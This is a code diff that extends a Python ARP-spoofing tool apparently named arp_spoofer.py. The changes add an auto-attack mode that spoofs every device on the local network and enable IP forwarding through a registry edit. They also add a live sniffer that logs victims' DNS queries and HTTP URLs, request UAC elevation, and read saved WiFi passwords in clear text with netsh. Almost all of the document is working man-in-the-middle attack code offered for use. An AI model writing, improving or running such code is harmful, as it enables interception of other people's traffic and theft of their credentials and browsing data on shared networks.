-            bssid = self._parse_value(out, "BSSID")
+            ok, out = run_netsh("netsh wlan show interfaces")
+            bssid = parse_netsh_field(out, "BSSID")
             if bssid:
                 initial_bssid_prefix = bssid[:8].lower()
 
@@ -702,7 +1096,9 @@ class NetworkResilience:
             return False
         self._ensure_wifi_profile(ssid, password, auth)
         ok, out = run_cmd(f'netsh wlan connect name="{ssid}" ssid="{ssid}"')
-        if ok or "success" in out.lower():
+        out_low = out.lower()
+        success_markers = ("success", "successfully", "connected", "complete", "connect")
+        if ok or any(marker in out_low for marker in success_markers):
             time.sleep(4)
             return True
         return False
@@ -731,6 +1127,8 @@ class NetworkResilience:
                 pass
 
     def _build_wifi_profile_xml(self, ssid: str, password: str, auth: str) -> str:
+        ssid = xml_escape.escape(ssid)
+        password = xml_escape.escape(password)
         auth_low = (auth or "").lower()
         is_open = "open" in auth_low or not password
         if is_open:
@@ -911,14 +1309,19 @@ class NetworkResilience:
             s.close()
 
         if os.name == "nt":
-            ok, output = run_cmd("route print 0.0.0.0")
-            if ok:
-                for line in output.splitlines():
-                    if "0.0.0.0" in line and "Active Routes" not in line:
+            gateway = powershell_value(
+                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | "
+                "Sort-Object RouteMetric | Select-Object -First 1).NextHop"
+            )
+            if not gateway or not re.match(r"\d+\.\d+\.\d+\.\d+", gateway):
+                ok, output = run_cmd("route print 0.0.0.0")
+                if ok:
+                    for line in output.splitlines():
                         parts = line.split()
-                        if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[2]):
-                            gateway = parts[2]
-                            break
+                        if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
+                            if re.match(r"\d+\.\d+\.\d+\.\d+", parts[2]):
+                                gateway = parts[2]
+                                break
         else:
             ok, output = run_cmd("ip route | grep default")
             if ok:
@@ -951,10 +1354,8 @@ class NetworkResilience:
         ok, out = run_cmd("netsh interface show interface")
         if ok:
             for line in out.splitlines():
-                if "Connected" in line or "Connecté" in line:
+                if "Connected" in line:
                     idx = line.find("Dedicated")
-                    if idx == -1:
-                        idx = line.find("Réseau")
                     if idx != -1:
                         return line[idx:].split(None, 1)[-1].strip()
         return ""
@@ -963,12 +1364,13 @@ class NetworkResilience:
         ok, out = run_cmd(f'netsh wlan show profile name="{ssid}" key=clear')
         if not ok:
             return ""
-        match = re.search(r"Key Content\s*:\s*(.+)", out, re.I)
+        match = re.search(
+            r"(?:Key Content|Contenu de la cl[eé])\s*:\s*(.+)", out, re.I
+        )
         return match.group(1).strip() if match else ""
 
     def _parse_value(self, text: str, key: str) -> str:
-        match = re.search(rf"{key}\s*:\s*(.+)", text, re.I)
-        return match.group(1).strip() if match else ""
+        return parse_netsh_field(text, key)
 
     def _parse_wifi_scan(self, output: str) -> list[WifiNetwork]:
         networks = []
@@ -1014,17 +1416,19 @@ def get_arguments():
   {Fore.WHITE}python arp_spoofer.py --scan
   {Fore.WHITE}python arp_spoofer.py --scan -o devices.json
   {Fore.WHITE}python arp_spoofer.py --scan-wifi
+  {Fore.WHITE}python arp_spoofer.py --scan-wifi -o wifi.json
   {Fore.WHITE}python arp_spoofer.py -a -s
   {Fore.WHITE}python arp_spoofer.py -r 192.168.1.0/24 -g 192.168.1.1 -a -s
 
 {Fore.LIGHTMAGENTA_EX}NOTES:
   - Use --scan to list devices on the current network and exit.
   - Use --scan-wifi to list available WiFi networks and exit.
-  - Use -o/--output to export scan results (.json or .csv).
+  - Use -o/--output to export scan results (.json or .csv) for --scan and --scan-wifi.
   - Use -a to attack everyone on the network automatically.
   - Use -s to enable the live DNS/HTTP traffic sniffer.
   - Auto-detects gateway/range if -r/-g omitted (Windows).
   - Auto-recovery: DHCP, IP change, MAC rotate, WiFi reconnect, captive portal.
+  - Automatically requests administrator elevation via UAC on Windows.
         """,
     )
     parser.add_argument(
@@ -1062,15 +1466,37 @@ def get_arguments():
         action="store_true",
         help="Disable automatic internet/WiFi recovery",
     )
+    parser.add_argument(
+        "--no-elevate",
+        action="store_true",
+        help="Skip automatic UAC administrator elevation (Windows)",
+    )
     return parser.parse_args()
 
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
-    return answered_list[0][1].hwsrc if answered_list else None
+def get_mac(ip, retries=2):
+    for _ in range(retries):
+        try:
+            arp_request = scapy.ARP(pdst=ip)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast / arp_request
+            answered_list = scapy.srp(
+                arp_request_broadcast, timeout=2, verbose=False, retry=1
+            )[0]
+            if answered_list:
+                return answered_list[0][1].hwsrc
+        except Exception:
+            time.sleep(0.5)
+    return None
+
+
+def get_local_ip() -> str:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except OSError:
+        return ""
 
 
 def silent_scan(ip_range):
@@ -1085,7 +1511,7 @@ def silent_scan(ip_range):
 
 
 def visual_scan(ip_range):
-    print(f"{Fore.BLUE}[*] Initializing Network Scan on {ip_range}...")
+    log_info(f"Initializing Network Scan on {ip_range}...")
     answered_list = scapy.srp(
         scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range),
         timeout=3,
@@ -1093,9 +1519,9 @@ def visual_scan(ip_range):
     )[0]
     clients = []
 
-    print(f"\n{Fore.WHITE}┌{'─' * 17}┬{'─' * 22}┬{'─' * 25}┐")
-    print(f"{Fore.WHITE}│ {'IP Address':<15} │ {'MAC Address':<20} │ {'Device Name':<23} │")
-    print(f"{Fore.WHITE}├{'─' * 17}┼{'─' * 22}┼{'─' * 25}┤")
+    safe_print(f"\n{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")
+    safe_print(f"{Fore.WHITE}| {'IP Address':<15} | {'MAC Address':<20} | {'Device Name':<23} |")
+    safe_print(f"{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")
 
     for element in answered_list:
         ip = element[1].psrc
@@ -1105,25 +1531,31 @@ def visual_scan(ip_range):
         except Exception:
             name = "Unknown Device"
         clients.append({"ip": ip, "mac": mac, "name": name})
-        print(
-            f"{Fore.WHITE}│ {Fore.GREEN}{ip:<15} {Fore.WHITE}│ "
-            f"{Fore.LIGHTBLACK_EX}{mac:<20} {Fore.WHITE}│ "
-            f"{Fore.MAGENTA}{name:<23} {Fore.WHITE}│"
+        safe_print(
+            f"{Fore.WHITE}| {Fore.GREEN}{ip:<15} {Fore.WHITE}| "
+            f"{Fore.LIGHTBLACK_EX}{mac:<20} {Fore.WHITE}| "
+            f"{Fore.MAGENTA}{name:<23} {Fore.WHITE}|"
         )
 
-    print(f"{Fore.WHITE}└{'─' * 17}┴{'─' * 22}┴{'─' * 25}┘")
-    print(f"\n{Fore.GREEN}[+] Found {len(clients)} device(s).")
+    safe_print(f"{Fore.WHITE}+{'-' * 17}+{'-' * 22}+{'-' * 25}+")
+    log_ok(f"Found {len(clients)} device(s).")
     return clients
 
 
 def enable_ip_forwarding():
     if os.name == "nt":
         run_cmd("netsh interface ipv4 set global forwarding=enabled")
+        run_cmd(
+            r'reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" '
+            r"/v IPEnableRouter /t REG_DWORD /d 1 /f"
+        )
     else:
         run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 
 def spoof(target_ip, target_mac, spoof_ip):
+    if not target_mac:
+        return
     packet = scapy.Ether(dst=target_mac) / scapy.ARP(
         op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
     )
@@ -1131,6 +1563,8 @@ def spoof(target_ip, target_mac, spoof_ip):
 
 
 def restore(destination_ip, destination_mac, source_ip, source_mac):
+    if not destination_mac or not source_mac:
+        return
     packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
         op=2,
         pdst=destination_ip,
@@ -1141,16 +1575,59 @@ def restore(destination_ip, destination_mac, source_ip, source_mac):
     scapy.sendp(packet, count=4, verbose=False)
 
 
+def _decode_http_field(value) -> str:
+    if value is None:
+        return ""
+    if isinstance(value, bytes):
+        return value.decode("utf-8", errors="replace")
+    return str(value)
+
+
+def _normalize_dns_name(qname) -> str:
+    if qname is None:
+        return ""
+    if isinstance(qname, bytes):
+        text = qname.decode("utf-8", errors="ignore")
+    else:
+        text = str(qname)
+    text = text.replace("\x00", "").strip().strip(".")
+    text = "".join(ch for ch in text if ch.isprintable() and ch not in "\r\n\t")
+    return text
+
+
+def _extract_dns_queries(packet) -> list[str]:
+    if not packet.haslayer(scapy.DNS):
+        return []
+    dns = packet[scapy.DNS]
+    if dns.qr != 0 or dns.qd is None:
+        return []
+
+    qd = dns.qd
+    records = qd if isinstance(qd, list) else [qd]
+    names = []
+    for record in records:
+        if record is None:
+            continue
+        name = _normalize_dns_name(getattr(record, "qname", b""))
+        if not name:
+            continue
+        if name in {".", "local"}:
+            continue
+        names.append(name)
+    return names
+
+
 def process_packet(packet):
-    if packet.haslayer(scapy.DNSQR):
-        url = packet[scapy.DNSQR].qname.decode()
-        print(f"\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{url.strip('.')}")
-    if packet.haslayer(http.HTTPRequest):
-        url = (
-            packet[http.HTTPRequest].Host.decode()
-            + packet[http.HTTPRequest].Path.decode()
-        )
-        print(f"\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{url}")
+    try:
+        for name in _extract_dns_queries(packet):
+            safe_print(f"\n{Fore.LIGHTMAGENTA_EX}[DNS LOG] {Fore.WHITE}{name}")
+        if packet.haslayer(http.HTTPRequest):
+            host = _decode_http_field(packet[http.HTTPRequest].Host)
+            path = _decode_http_field(packet[http.HTTPRequest].Path) or "/"
+            if host:
+                safe_print(f"\n{Fore.GREEN}[WEB LOG] {Fore.WHITE}{host}{path}")
+    except Exception:
+        pass
 
 
 class SpoofSession:
@@ -1171,6 +1648,7 @@ class SpoofSession:
         self._target_failures: dict[str, int] = {}
 
     def setup_targets(self):
+        local_ip = get_local_ip()
         if self.args.all:
             log_info("Auto-Attack Mode: Scanning network silently...")
             devices = silent_scan(self.ip_range)
@@ -1178,7 +1656,7 @@ class SpoofSession:
                 self.targets = [
                     {"ip": d["ip"], "mac": d["mac"]}
                     for d in devices
-                    if d["ip"] != self.gateway
+                    if d["ip"] != self.gateway and d["ip"] != local_ip
                 ]
         else:
             devices = visual_scan(self.ip_range)
@@ -1217,7 +1695,11 @@ class SpoofSession:
         self.last_target_refresh = now
         log_info("Refreshing target list...")
         devices = silent_scan(self.ip_range)
-        new_targets = [d for d in devices if d["ip"] != self.gateway]
+        local_ip = get_local_ip()
+        new_targets = [
+            d for d in devices
+            if d["ip"] != self.gateway and d["ip"] != local_ip
+        ]
         with self._targets_lock:
             known_ips = {t["ip"] for t in self.targets}
             for t in new_targets:
@@ -1270,7 +1752,7 @@ class SpoofSession:
                     self.ip_range = ctx.ip_range
 
                 if not self.verify_gateway():
-                    log_warn("Gateway unreachable — attempting network recovery...")
+                    log_warn("Gateway unreachable - attempting network recovery...")
                     if not self.args.no_recovery:
                         self.resilience.recover_connectivity()
                         ctx = self.resilience.refresh_context()
@@ -1303,14 +1785,20 @@ class SpoofSession:
                 if ctx.ip_range:
                     self.ip_range = ctx.ip_range
                 if not self.verify_gateway():
-                    return
+                    sys.exit(1)
             else:
-                return
+                sys.exit(1)
 
         if self.args.sniff:
             log_info("Traffic Sniffer: Online")
+            sniff_filter = "ip or arp"
             sniff_thread = threading.Thread(
-                target=lambda: scapy.sniff(prn=process_packet, store=False),
+                target=lambda: scapy.sniff(
+                    prn=process_packet,
+                    store=False,
+                    filter=sniff_filter,
+                    stop_filter=lambda _: self._stop.is_set(),
+                ),
                 daemon=True,
             )
             sniff_thread.start()
@@ -1320,7 +1808,7 @@ class SpoofSession:
         watchdog = threading.Thread(target=self.watchdog_loop, daemon=True)
         watchdog.start()
 
-        print(f"\n{Fore.RED}[⚡] BY LTX - ATTACK ACTIVE")
+        safe_print(f"\n{Fore.RED}[!] BY LTX - ATTACK ACTIVE")
         try:
             while True:
                 self.spoof_cycle()
@@ -1331,7 +1819,7 @@ class SpoofSession:
                 hours, rem = divmod(uptime, 3600)
                 mins, secs = divmod(rem, 60)
                 uptime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"
-                print(
+                safe_print(
                     f"\r{Fore.WHITE}Packets: {Fore.GREEN}{self.sent} "
                     f"{Fore.WHITE}| Targets: {Fore.GREEN}{target_count} "
                     f"{Fore.WHITE}| Internet: {Fore.GREEN if status == 'ONLINE' else Fore.RED}{status} "
@@ -1380,9 +1868,10 @@ def resolve_network_args(args) -> tuple[str, str]:
 
 
 def run_scan_mode(args):
+    setup_scapy_iface()
     ip_range, _ = resolve_network_args(args)
     print_banner()
-    log_info(f"Standalone scan mode — range: {ip_range}")
+    log_info(f"Standalone scan mode - range: {ip_range}")
     devices = visual_scan(ip_range)
     if args.output and devices:
         export_scan_results(devices, args.output)
@@ -1396,8 +1885,9 @@ def run_wifi_scan_mode(args):
         sys.exit(1)
     resilience = NetworkResilience(NetworkContext())
     resilience.capture_initial_wifi()
-    log_info("Scanning WiFi networks...")
-    resilience.display_wifi_scan()
+    networks = resilience.display_wifi_scan()
+    if args.output and networks:
+        export_wifi_results(networks, args.output)
     sys.exit(0)
 
 
@@ -1418,10 +1908,14 @@ def main():
     print_banner()
 
     if os.name == "nt" and not check_admin_windows():
-        log_warn("Not running as Administrator — ARP spoofing and recovery may fail.")
-        log_warn("Right-click CMD/PowerShell -> Run as administrator.")
+        log_warn("Running without administrator rights - some features may not work.")
+        log_warn("Relaunch without --no-elevate to trigger the UAC prompt.")
 
     init_session_logger(args.log_file)
+
+    setup_scapy_iface()
+    if conf.iface:
+        log_info(f"Network interface: {conf.iface}")
 
     args.ip_range, args.gateway = resolve_network_args(args)
     log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")
@@ -1434,7 +1928,7 @@ def main():
     resilience.refresh_context()
 
     if not args.no_recovery and not resilience.has_internet():
-        log_warn("No internet at startup — running recovery...")
+        log_warn("No internet at startup - running recovery...")
         resilience.recover_connectivity()
         ctx = resilience.refresh_context()
         if ctx.ip_range:
@@ -1450,6 +1944,7 @@ def main():
 
 
 if __name__ == "__main__":
+    request_admin_elevation()
     main()
 
 # Made by LTX74
